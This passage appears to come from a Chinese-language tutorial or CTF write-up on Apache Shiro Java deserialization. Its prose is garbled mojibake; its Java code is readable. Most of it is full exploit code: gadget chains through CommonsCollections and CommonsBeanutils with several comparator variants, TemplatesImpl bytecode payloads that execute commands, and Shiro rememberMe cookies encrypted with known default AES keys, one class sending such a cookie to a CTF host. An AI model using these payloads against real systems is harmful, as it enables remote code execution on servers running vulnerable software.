å…¶ä¸­TiedMapEntryä¸­çš„keyå’Œvalueéƒ½å¯æ§, è€Œçœ‹ä¸€ä¸‹LazyMap.get public Object get(Object key) { // create value for key if key is not currently in the map if (map.containsKey(key) == false) { // ä¼ å…¥çš„keyå€¼å¯æ§, factoryå¯æ§ Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } å°†æ„é€ å¥½çš„TemplatesImplï¼ˆkeyï¼‰ä½œä¸ºInvokerTransformer.transformå‡½æ•°çš„inputä¼ å…¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†templates gadgetsä¸²èµ·æ¥äº†, ä¹Ÿå°±æ˜¯é€šè¿‡InvokerTransformer.transformå»è°ƒç”¨TemplatesImpl.newTransformerä»è€Œè§¦å‘å­—èŠ‚ç å‘½ä»¤æ‰§è¡Œ POC import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollectionsShiro { public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); // Map outerMap = LazyMap.decorate(innerMap, transformer); Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, templates); Map expMap = new HashMap(); expMap.put(tiedmapentry, \"valuevalue\"); // æ¸…é™¤é”®å€¼ outerMap.clear(); // é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iMethodNameï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°è§¦å‘æ¶æ„æ–¹æ³• setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } åŠ å¯†è°ƒç”¨ import javassist.ClassPool; import javassist.CtClass; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client { public static void main(String []args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode()); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); } } è§¦å‘æ•ˆæœå¦‚ä¸‹ ç”¨CommonsCollections10ä¹Ÿæ˜¯å¯ä»¥çš„ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.DefaultedMap; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CommonsCollections10 { public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); // Map outerMap = LazyMap.decorate(innerMap, transformer); Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedMapEntry1 = new TiedMapEntry(outerMap, templates); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(\"keykey\", 1); // è·å–hashtableçš„tableç±»å±æ€§ Field tableField = Hashtable.class.getDeclaredField(\"table\"); tableField.setAccessible(true); Object[] table = (Object[])tableField.get(hashtable); Object tiedMapEntry2 = table[0]; if(tiedMapEntry2 == null) tiedMapEntry2 = table[1]; // è·å–Hashtable.Entryçš„keyå±æ€§ Field keyField = tiedMapEntry2.getClass().getDeclaredField(\"key\"); keyField.setAccessible(true); // å°†keyå±æ€§ç»™æ›¿æ¢æˆæ„é€ å¥½çš„TiedMapEntryå®ä¾‹ keyField.set(tiedMapEntry2, tiedMapEntry1); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // å­—èŠ‚è°ƒç”¨å†™æ³• ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(hashtable); oos.close(); return barr.toByteArray(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC15æ”¹è£…æ„é€  CC4ä¸­çš„InstantiateTransformerä¹Ÿå¯ç”¨äºCommonsCollections 3.2.1, é«˜ç‰ˆæœ¬ _tfactory éœ€è¦è‡ªè¡Œæ·»åŠ , Shiroååºåˆ—åŒ–æ—¶ä¸ä¼šè‡ªåŠ¨è¡¥å……, ä¹Ÿæ˜¯æºäºä¸€æ¬¡æ¯”èµ›çš„æ„é€  package CommonsBeanutils; import cn.hutool.http.HttpRequest; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import javax.xml.transform.Templates; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class CommonsCollectionsShiro2 { public static void main(String[] args) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{ClassPool.getDefault().get(Evil.class.getName()).toBytecode()}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); Transformer faketransformer = new InvokerTransformer(\"getClass\", null, null); Transformer transformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, faketransformer); // Map outerMap = DefaultedMap.decorate(innerMap, transformer); TiedMapEntry tiedmapentry = new TiedMapEntry(outerMap, TrAXFilter.class); Map expMap = new HashMap(); expMap.put(tiedmapentry, \"valuevalue\"); // æ¸…é™¤é”®å€¼ outerMap.clear(); // é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„factoryï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°è§¦å‘æ¶æ„æ–¹æ³• setFieldValue(outerMap, \"factory\", transformer); // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); byte[] key = Base64.getDecoder().decode(\"7Bhs26ccN6i/0AT9GhZULF==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key); // System.out.println(ciphertext.toString()); String rem = ciphertext.toString(); // æµ‹è¯• // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // ois.readObject(); // ois.close(); String url=\"http://eci-2zefymd8icss9keczft1.cloudeci1.ichunqiu.com:8888/ricky\"; HttpRequest httpRequest = HttpRequest.get(url).cookie(\"rememberMe=\"+rem); httpRequest.execute(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } éœ€è¦æ·»åŠ çš„ä¾èµ– cn.hutool hutool-all 5.7.22 CommonsBeanutils JavaBean å¦‚æœä¸€ä¸ªç±»çš„è¯»å†™æ–¹æ³•ç¬¦åˆä»¥ä¸‹è¿™ç§å‘½åè§„èŒƒï¼š // è¯»æ–¹æ³•: public Type getXyz() // å†™æ–¹æ³•: public void setXyz(Type value) é‚£ä¹ˆè¿™ç§classè¢«ç§°ä¸ºJavaBean ä¾‹å¦‚è¯¥Catç±»å°±æ˜¯ä¸€ä¸­JavaBean final public class Cat { private String name = \"catalina\"; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutilsä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³• PropertyUtils.getProperty ï¼Œè®©ä½¿ç”¨è€…å¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„JavaBeançš„getteræ–¹æ³• PropertyUtils.getProperty(new Cat(), \"name\"); commons-beanutilsä¼šè‡ªåŠ¨æ‰¾åˆ°nameå±æ€§çš„getteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ getNameï¼Œç„¶åè°ƒç”¨ï¼Œè·å¾—è¿”å›å€¼ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒPropertyUtils.getProperty è¿˜æ”¯æŒé€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚aå¯¹è±¡ä¸­æœ‰å±æ€§bï¼Œbå¯¹è±¡ä¸­æœ‰å±æ€§cï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ PropertyUtils.getProperty(a, \"b.c\"); çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¿™ä¸ªæ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„getterï¼Œé€‚ç”¨äºåœ¨ä¸ç¡®å®šJavaBeanæ˜¯å“ªä¸ªç±»å¯¹è±¡æ—¶ä½¿ç”¨ commons-beanutilsä¸­æœ‰ä¸ªBeanComparator, ç¬¦åˆCommonsCollections4ä¸­éœ€è¦comparatorè§¦å‘çš„æ¡ä»¶, å½“å…¶è°ƒç”¨compareæ–¹æ³•æ—¶, è·Ÿè¿›BeanComparator#compare() public int compare( Object o1, Object o2 ) { if ( property == null ) { // compare the actual objects return comparator.compare( o1, o2 ); } try { Object value1 = PropertyUtils.getProperty( o1, property ); Object value2 = PropertyUtils.getProperty( o2, property ); return comparator.compare( value1, value2 ); } catch ( IllegalAccessException iae ) { throw new RuntimeException( \"IllegalAccessException: \" + iae.toString() ); } catch ( InvocationTargetException ite ) { throw new RuntimeException( \"InvocationTargetException: \" + ite.toString() ); } catch ( NoSuchMethodException nsme ) { throw new RuntimeException( \"NoSuchMethodException: \" + nsme.toString() ); } } å‡è®¾o1æ˜¯ TemplateImpl å®ä¾‹, è€Œo2æ˜¯ outputProperties , åˆ™å¯ä»¥ä½¿ç”¨ PropertyUtils.getProperty è°ƒç”¨TemplatesImpl#getOutputProperties()ä»è€Œè§¦å‘ä»£ç æ‰§è¡Œ, å…¶ä¸­ å®ä¾‹æ˜¯ç”± PriorityQueue ä¼ å…¥çš„, è€Œ outputProperties æ˜¯ BeanComparator ä¸­çš„å±æ€§ private String property; POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1 { public static void main(String[] args) throws Exception{ // å®ä¾‹åŒ–ä¸€ä¸ªBeanComparatorå¯¹è±¡ BeanComparator beanComparator = new BeanComparator(); setFieldValue(beanComparator, \"property\", \"outputProperties\"); // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = TemplatesImpl.class.newInstance(); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templates, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); // å®ä¾‹åŒ–PriorityQueueå¯¹è±¡ PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // é€šè¿‡addå»ºç«‹sizeä¸º2çš„æ•°ç»„ priorityQueue.add(templates);priorityQueue.add(templates); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } æ— ä¾èµ–Shiroååºåˆ—åŒ– å½“Shiroè„±ç¦»CommonsCollectionsæ—¶, å…¶æœ¬èº«è¿˜æ˜¯å¯ä»¥è¿›è¡Œååºåˆ—åŒ–, è€Œä¸”ä¾èµ–ä¸­ä»å­˜åœ¨ commons-banutilsã€‚ åœ¨æ²¡æœ‰commons-collectionsä¸‹ä½¿ç”¨BeanComparatorå»å»ºç«‹Shiroååºåˆ—åŒ–ä¼šå‘ç°å¦‚ä¸‹çš„é—®é¢˜ commons-beanutilsæœ¬æ¥ä¾èµ–äºcommons-collectionsï¼Œä½†æ˜¯åœ¨Shiroä¸­ï¼Œå®ƒçš„commons-beanutilsè™½ç„¶åŒ…å«äº†ä¸€éƒ¨åˆ†commons-collectionsçš„ç±»ï¼Œä½†å´ä¸å…¨ã€‚è¿™ä¹Ÿå¯¼è‡´ï¼Œæ­£å¸¸ä½¿ç”¨Shiroçš„æ—¶å€™ä¸éœ€è¦ä¾èµ–äº commons-collectionsï¼Œä½†ååºåˆ—åŒ–åˆ©ç”¨çš„æ—¶å€™éœ€è¦ä¾èµ–äºcommons-collectionsã€‚ æˆ‘ä»¬å¯ä»¥è·Ÿè¿›BeanComparatorç±»ä¼šå‘ç°ä¸åŒ…å«ComparableComparatorç±» åœ¨ BeanComparator ç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥ Comparator çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ ComparableComparatorã€‚ public BeanComparator( String property ) { this( property, ComparableComparator.getInstance() ); } æ—¢ç„¶æ­¤æ—¶æ²¡æœ‰ ComparableComparator ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥æ›¿æ¢ï¼Œå®ƒæ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ å®ç° java.util.Comparator æ¥å£ å®ç° java.io.Serializable æ¥å£ Javaã€shiroæˆ–commons-beanutilsè‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º å¯ä»¥æ‰¾æ‰“ç»§æ‰¿Comparatoræ–¹æ³•çš„ç±» CaseInsensitiveComparator ReverseComparator AttarComparator CaseInsensitiveComparator é€šè¿‡ String.CASE_INSENSITIVE_ORDER å³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„ CaseInsensitiveComparator å¯¹è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ– BeanComparator public static final Comparator CASE_INSENSITIVE_ORDER = new CaseInsensitiveComparator(); private static class CaseInsensitiveComparator implements Comparator, java.io.Serializable { // use serialVersionUID from JDK 1.2.2 for interoperability private static final long serialVersionUID = 8575799808933029326L; public int compare(String s1, String s2) { int n1 = s1.length(); int n2 = s2.length(); int min = Math.min(n1, n2); for (int i = 0; i POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1 { public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // å®ä¾‹åŒ–ä¸€ä¸ªBeanComparatorå¯¹è±¡ final BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); // å®ä¾‹åŒ–PriorityQueueå¯¹è±¡ PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(\"1\");priorityQueue.add(\"2\"); /**æ¢ç”¨ç»§æ‰¿ä¼šè§¦å‘ä¸€äº›é¡ºåºä¸Šçš„é—®é¢˜*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } åŠ å¯†è°ƒç”¨ package CommonsBeanutils; import javassist.ClassPool; import javassist.CtClass; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client1 { public static void main(String []args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); // byte[] payloads = new CommonsBeanutils1().getPayload(clazz.toBytecode()); byte[] payloads = new CommonsBeanutils1Shiro().getPayload(clazz.toBytecode()); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); } } è§¦å‘æ•ˆæœ ReverseComparator é€šè¿‡ Collections#reverseOrder() å³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„ ReverseComparator å¯¹è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ– BeanComparator public static Comparator reverseOrder() { return (Comparator) ReverseComparator.REVERSE_ORDER; } /** * @serial include */ private static class ReverseComparator implements Comparator>, Serializable { private static final long serialVersionUID = 7207038068494060240L; static final ReverseComparator REVERSE_ORDER = new ReverseComparator(); public int compare(Comparable c1, Comparable c2) { return c2.compareTo(c1); } private Object readResolve() { return Collections.reverseOrder(); } @Override public Comparator> reversed() { return Comparator.naturalOrder(); } } ä¿®æ”¹å¤„ /**ä½¿ç”¨ReverseComparatorç±»*/ final BeanComparator beanComparator = new BeanComparator(null, Collections.reverseOrder()); final BeanComparator beanComparator = new BeanComparator(null, Comparator.reverseOrder().reversed()); final BeanComparator beanComparator = new BeanComparator(null, Comparator.naturalOrder().reversed()); AttrCompare PriorityQueue#add()å¤„éœ€è¦æ·»åŠ å¸¦å‚æ•°ä¸”ç»§æ‰¿Attræ¥å£çš„ç±» AttrNSImpl PSVIAttrNSImpl æœ‰å‚æ„é€ å¯å‚è€ƒéœ€è¦çš„å‚æ•°, è¿™ä¸¤ä¸ªç±»éœ€è¦çš„å‚æ•°æ˜¯ç›¸åŒçš„ AttrNSImpl(CoreDocumentImpl ownerDocument, String namespaceURI, String qualifiedName, String localName) POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xerces.internal.dom.*; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils2_AttrComparator { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // éœ€è¦å¸¦å‚æ•°ä¸”ç»§æ‰¿Attræ¥å£ AttrNSImpl æœ‰å‚æ„é€  AttrNSImpl attrNS1 = new AttrNSImpl(new CoreDocumentImpl(), \"1\", \"1\", \"1\"); // PSVIAttrNSImpl æœ‰å‚æ„é€  PSVIAttrNSImpl psviAttrNS = new PSVIAttrNSImpl(new CoreDocumentImpl(), \"1\", \"1\", \"1\"); /**ä½¿ç”¨AttrComparatorç±»*/ final BeanComparator beanComparator = new BeanComparator(null, new AttrCompare()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(psviAttrNS);priorityQueue.add(psviAttrNS); /**æ¢ç”¨ç»§æ‰¿ä¼šè§¦å‘ä¸€äº›é¡ºåºä¸Šçš„é—®é¢˜*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } } è¿˜æœ‰ä¸€äº›å¯ç”¨çš„Comparabtoræ˜¯å»ºç«‹åœ¨ä¾èµ–çš„åŸºç¡€ä¸Š org.apache.commons.lang3.compare.ObjectToStringComparator org.apache.commons commons-lang3 3.12.0 â†“â†“â†“ // ObjectToStringComparator stringComparator = new ObjectToStringComparator(); final BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(\"1\");priorityQueue.add(\"2\"); /**æ¢ç”¨ç»§æ‰¿ä¼šè§¦å‘ä¸€äº›é¡ºåºä¸Šçš„é—®é¢˜*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); org.apache.logging.log4j.util.PropertySource org.apache.logging.log4j log4j-api 2.13.3 â†“â†“â†“ /**ä½¿ç”¨PropertySource.Comparatorç±»*/ final PropertySource propertySource = new PropertySource() { public int getPriority() { return 0; } }; final BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(propertySource);priorityQueue.add(propertySource); /**æ¢ç”¨ç»§æ‰¿ä¼šè§¦å‘ä¸€äº›é¡ºåºä¸Šçš„é—®é¢˜*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); ObjectToStringComparator ä¾èµ– org.apache.commons commons-lang3 3.12.0 POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xerces.internal.dom.AttrNSImpl; import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import org.apache.commons.beanutils.BeanComparator; /** * * org.apache.commons * commons-lang3 * 3.12.0 * * */ import org.apache.commons.lang3.compare.ObjectToStringComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils2_ObjectToStringComparator { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); /**ä½¿ç”¨ObjectToStringComparatorç±»*/ // ObjectToStringComparator stringComparator = new ObjectToStringComparator(); final BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(\"1\");priorityQueue.add(\"2\"); /**æ¢ç”¨ç»§æ‰¿ä¼šè§¦å‘ä¸€äº›é¡ºåºä¸Šçš„é—®é¢˜*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } } PropertySource org.apache.logging.log4j log4j-api 2.13.3 POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xerces.internal.dom.AttrNSImpl; import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl; import org.apache.commons.beanutils.BeanComparator; import org.apache.logging.log4j.util.PropertySource; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import 